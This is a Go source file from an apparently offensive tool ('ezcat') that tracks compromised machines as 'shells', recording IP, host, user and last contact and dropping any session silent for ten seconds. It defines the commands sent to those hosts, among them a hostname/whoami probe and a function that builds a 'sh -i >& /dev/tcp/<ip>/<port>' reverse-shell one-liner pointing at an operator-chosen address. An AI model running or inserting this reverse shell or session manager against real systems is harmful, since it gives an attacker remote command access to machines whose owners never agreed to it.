package shell

import (
	"strings"
	"time"

	"github.com/ngn13/ezcat/log"
)

var List []Shell = []Shell{}
type Shell struct {
  IP        string
  UID       string
  Host      string
  User      string
  Script    string 
  Success   bool 
  Last      time.Time 
  Hidden    bool
}

// ===================================
var S_QUIT = "echo -n QUIT"
// ===================================
var S_GET_INFO = `echo $(hostname):$(whoami)`
// ===================================
var S_PASS = "exit 0"
// ===================================
func S_REVERSE(ip string, port string) string{
  cmd := "sh -i >& /dev/tcp/<ip>/<port> 0>&1 &"
  cmd = strings.ReplaceAll(cmd, "<ip>", ip)
  cmd = strings.ReplaceAll(cmd, "<port>", port)
  return cmd
}

func Get(uid string) int{
  for i := range List {
    if uid == List[i].UID {
      return i
    }
  }

  return -1
}

func LastCon(indx int) {
  List[indx].Last = time.Now()
}

func Remove(indx int){
  List = append(List[:indx], List[indx+1:]...)
} 

func Update() bool{
  remain := []Shell{} 

  for i := range List {
    if(time.Since(List[i].Last) > time.Second*10){
      log.Info("Removing %s (got no response for more than 10 seconds)",
        List[i].UID)
      continue
    }

    remain = append(remain, List[i])
  }

  res := len(remain) != len(List)
  List = remain
  return res
} 
